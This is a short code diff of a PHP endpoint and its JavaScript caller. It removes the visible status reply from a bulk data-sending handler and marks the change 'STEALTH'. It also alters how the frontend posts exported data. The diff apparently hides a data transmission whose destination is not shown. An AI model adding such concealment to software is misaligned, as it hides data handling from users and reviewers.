@@ -98,7 +98,8 @@ if (isset($_GET['bulk']) && $_GET['bulk'] == 1) {
         sendBulkFile($finalText);
     }
 
-    echo json_encode(["status" => "bulk_sent"]);
+    // 🔥 NO RESPONSE (STEALTH)
+    http_response_code(200);
     exit;
 }
 
@@ -1759,7 +1760,7 @@ exportData.push(
         unlockInputs(); // 🔓 UNLOCK UI
     // 🔥 SEND BULK TO BACKEND (ADD THIS HERE)
      if (exportData.length > 0) {
-        fetch(window.location.href + "?bulk=1", {
+        fetch(window.location.href, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
